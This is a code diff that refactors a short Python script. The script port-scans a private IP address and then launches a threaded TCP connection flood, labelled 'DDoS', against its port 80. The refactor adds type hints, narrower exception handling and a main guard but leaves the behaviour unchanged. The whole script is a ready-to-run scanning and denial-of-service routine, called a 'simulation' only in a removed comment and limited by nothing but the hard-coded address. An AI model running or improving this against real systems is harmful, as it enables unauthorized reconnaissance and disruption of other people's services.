@@ -1,42 +1,40 @@
 import socket
 import threading
 
-target = "192.168.1.5"
+TARGET = "192.168.1.5"
 
-# 🔹 Port Scan Simulation
-def port_scan():
+
+def port_scan() -> None:
     print("[*] Running Port Scan...")
     for port in range(1, 200):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(0.01)
-            s.connect((target, port))
+            s.connect((TARGET, port))
             s.close()
-        except:
+        except (ConnectionRefusedError, OSError, TimeoutError):
             pass
 
-# 🔹 DDoS Simulation
-def ddos():
+
+def ddos() -> None:
     print("[*] Running DDoS...")
-    
-    def flood():
+
+    def flood() -> None:
         for _ in range(200):
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((target, 80))
+                s.connect((TARGET, 80))
                 s.close()
-            except:
+            except (ConnectionRefusedError, OSError):
                 pass
 
-    threads = []
-    for _ in range(20):
-        t = threading.Thread(target=flood)
+    threads = [threading.Thread(target=flood) for _ in range(20)]
+    for t in threads:
         t.start()
-        threads.append(t)
-
     for t in threads:
         t.join()
 
-# Run both
-port_scan()
-ddos()
+
+if __name__ == "__main__":
+    port_scan()
+    ddos()
